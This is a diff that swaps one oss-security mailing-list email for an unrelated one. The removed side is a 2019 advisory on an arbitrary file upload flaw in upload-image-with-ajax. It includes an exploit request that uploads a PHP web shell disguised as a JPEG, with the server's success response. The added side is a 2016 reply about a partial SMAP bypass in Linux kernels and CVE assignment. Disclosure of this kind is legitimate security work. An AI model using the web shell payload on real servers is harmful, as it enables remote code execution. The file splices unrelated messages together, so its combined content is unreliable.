@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2495" "Monday" "23" "December" "2019" "16:52:05" "-0500" "Larry W. Cashdollar" "larry0@me.com" nil "81" nil "^Date:" nil nil "12" nil nil (number mark "        larry0@me.co Dec 23   81/2495  " thread-indent "\"[oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1668" "Thursday" "31" "March" "2016" "17:03:08" "-0400" "Steve Grubb" "sgrubb@redhat.com" "<1763062.ChaLcRdSCz@x2>" "38" "Re: [oss-security] Re: Partial SMAP bypass on 64-bit Linux kernels" nil nil nil "3" "2016033121:03:08" "[oss-security] Re: Partial SMAP bypass on 64-bit Linux kernels" (number mark "U       sgrubb@redha Mar 31   38/1668  " thread-indent "\"Re: [oss-security] Re: Partial SMAP bypass on 64-bit Linux kernels\"\n") "<20160331203125.94DE28BC0A1@smtpvmsrv1.mitre.org>" ("<20160331203125.94DE28BC0A1@smtpvmsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1612 invoked by uid 550); 23 Dec 2019 21:52:20 -0000
+Received: (qmail 9349 invoked by uid 550); 31 Mar 2016 21:03:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,117 +11,58 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 1594 invoked from network); 23 Dec 2019 21:52:20 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
-	t=1577137927; bh=mk1BMjoKvSW/DCY6d0bb91IivFgeKCsejexd0K6ZotI=;
-	h=Date:Subject:From:To:Message-ID:Content-type;
-	b=HVhMTDaVJRIOVL2/Jj/RtVq+pYHRzvpqKNBaohHPpf8tzw2bg5Px3k6TrX2np5Ets
-	 fND0L8ZhxDWsLF2trBt92P96aNuKQZtvOSi/cIoGbN7jahr0GwnN6hcwRQGx+rEThQ
-	 7SvcXC/a2W45myUWKVpoVCniBoUO3DJf5fwgW8FDLcNhoB/lXWvD13bqPJ5fAN+sm9
-	 Vp2BH0UBNAtruioEbLlzSo0gEmeFNWL6DRDUdawcJarkgKeBZEzAqveCt8upjqi8KH
-	 J+13bi1RUEZLai8ZzWearssjL2q4ZeUyKUAs5F+fZqmQNMlfKWdFvTM1pnZ22whEMI
-	 oWDsyfrM5Ijkw==
-User-Agent: Microsoft-MacOutlook/10.20.0.191208
-Message-ID: <3894D4AF-10B8-46F7-BAF5-C800F8FCFE20@me.com>
-Thread-Topic: Arbitrary file upload vulnerability in upload-image-with-ajax
- v1.0
-References: <BA02B4C0-17B0-4625-ABC8-FA6F52379002@me.com>
-In-Reply-To: <BA02B4C0-17B0-4625-ABC8-FA6F52379002@me.com>
-Mime-version: 1.0
-Content-type: text/plain;
-	charset="UTF-8"
-Content-transfer-encoding: quoted-printable
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,, definitions=2019-12-23_09:,,
- signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
- phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
- mlxlogscore=787 adultscore=0 classifier=spam adjust=0 reason=mlx
- scancount=1 engine=8.0.1-1908290000 definitions=main-1912230190
-Date: Mon, 23 Dec 2019 16:52:05 -0500
-From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Arbitrary file upload vulnerability in upload-image-with-ajax
- v1.0
-To: Open Security <oss-security@lists.openwall.com>
+Received: (qmail 9315 invoked from network); 31 Mar 2016 21:03:30 -0000
+From: Steve Grubb <sgrubb@redhat.com>
+To: oss-security@lists.openwall.com
+Cc: cve-assign@mitre.org
+Date: Thu, 31 Mar 2016 17:03:08 -0400
+Message-ID: <1763062.ChaLcRdSCz@x2>
+Organization: Red Hat
+User-Agent: KMail/4.14.10 (Linux/4.4.6-300.fc23.x86_64; KDE/4.14.18; x86_64; ; )
+In-Reply-To: <20160331203125.94DE28BC0A1@smtpvmsrv1.mitre.org>
+References: <20160331203125.94DE28BC0A1@smtpvmsrv1.mitre.org>
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7Bit
+Content-Type: text/plain; charset="us-ascii"
+X-Scanned-By: MIMEDefang 2.68 on 10.5.11.26
+Subject: Re: [oss-security] Re: Partial SMAP bypass on 64-bit Linux kernels
 
-Hello,
+On Thursday, March 31, 2016 04:31:25 PM cve-assign@mitre.org wrote:
+> > https://git.kernel.org/cgit/linux/kernel/git/tip/tip.git/commit/?h=x86/urg
+> > ent&id=3d44d51bd339766f0178f0cf2e8d048b4a4872aa
+> > 
+> > That patch fixes a bug that exposed a fairly large kernel code surface
+> > to a straightforward SMAP bypass.
+> > 
+> >> From: Salvatore Bonaccorso <carnil@debian.org>
+> >> Date: Tue, 29 Mar 2016 17:00:03 +0200
+> >> 
+> >> @MITRE CVE assignment team: Would it make sense to have a CVE id
+> >> assigned for this issue for better trackability?
+> 
+> We're going to approach this one in the same way as the issue that was
+> later assigned CVE-2016-2847.
+> 
+> Specifically, is there anyone who believes
+> 3d44d51bd339766f0178f0cf2e8d048b4a4872aa must not have a CVE ID?
+> 
+> The situation, very roughly, seems to be that the upstream vendor has
+> announced that the behavior is a bug. CLAC occurs at a correct place
+> for some types of entries, but accidentally did not occur at a correct
+> place in the case of entries through the int80 gate. Consequently,
+> exploits of kernel vulnerabilities can cause more damage in some
+> cases.
+> 
+> However, it seems to be a bug in how the kernel responds to a
+> post-exploitation attack pattern. This is not a topic area that
+> commonly has CVE ID assignments. Access by the kernel to a user space
+> page is not an action that "crosses a privilege boundary" in a
+> traditional sense.
 
-An update and a correction.
+What if an unprivileged application triggered a NULL pointer dereference that 
+was supposed to be accessing a data structure in the kernel for a policy 
+decision but instead used an attacker controlled structure mapped at address 
+0?
 
-The CVE number should be CVE-2019-8293.  The software author also has fixed=
- the vulnerability:
-
-https://github.com/abcprintf/upload-image-with-ajax/commit/71436ba510201039=
-7519d4b25ea57591cfb4974c
-
-Thanks,
-Larry
-
-=EF=BB=BFOn 12/23/19, 12:09 PM, "Larry W. Cashdollar" <larry0@me.com> wrote:
-
-    Title: Arbitrary file upload vulnerability in upload-image-with-ajax
-    Author: Larry W. Cashdollar
-    Date: 2019-12-16
-    CVE-ID:[CVE-2019-8292]
-    Download Site: https://github.com/abcprintf/upload-image-with-ajax/
-    Vendor: adcprintf
-    Vendor Notified: 2019-12-16
-    Vendor Contact: wh.cprintf@gmail.com
-    Advisory: http://www.vapidlabs.com/advisory.php?v=3D211
-    Description: upload-image-with-ajax
-    Vulnerability:
-    The code below changes the $ready flag to true if the file conforms to =
-the size of < 1000000. Reversing the check that the file is an image. So, a=
- .php file can be uploaded with only a warning allowing code execution.
-=20=20=20=20
-    $ready =3D false;
-    if((($imageType =3D=3D "image/jpeg") || ($imageType =3D=3D "image/jpg")=
- || ($imageType =3D=3D "image/png"))&&in_array($fileExt, $validext)){
-    $ready =3D true;
-    }else{
-    echo "was not an image
-    ";
-    /You should abort the upload right here/
-    }
-    if($_FILES["fileUpload"]["size"] < 1000000){
-    $ready =3D true;
-    echo "file size is ".$_FILES['fileUpload']["size"]."
-    ";
-    }else{
-    echo "file was TOO BIG!";
-    }
-=20=20=20=20
-    Exploit Code:
-     $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.p=
-hp
-    POST request size is 469 bytes
-=20=20=20=20=20
-    Sending Payload:
-    POST //upload-image-with-ajax/upload.php HTTP/1.1
-    Host: 192.168.0.3
-    User-Agent: File Upload Exploiter/v1.2
-    Accept: */*
-    Content-Length: 237
-    Content-Type: multipart/form-data; boundary=3D------------------------c=
-8e05c8871143853
-=20=20=20=20=20
-    --------------------------c8e05c8871143853
-    Content-Disposition: form-data; name=3D"fileUpload"; filename=3D"shell.=
-jpg"
-    Content-Type: image/jpeg
-=20=20=20=20=20
-    <?php $cmd=3D$_GET['cmd']; system($cmd);?>
-=20=20=20=20=20
-    --------------------------c8e05c8871143853--
-=20=20=20=20=20
-    HTTP/1.1 200 OK
-    Date: Mon, 16 Dec 2019 04:39:56 GMT
-    Server: Apache/2.4.25 (Debian)
-    Content-Length: 37
-    Content-Type: text/html; charset=3DUTF-8
-=20=20=20=20=20
-    file size is 42<br>upload successful!
-    [+] Total bytes read: 185
-=20=20=20=20
-
-
+-Steve
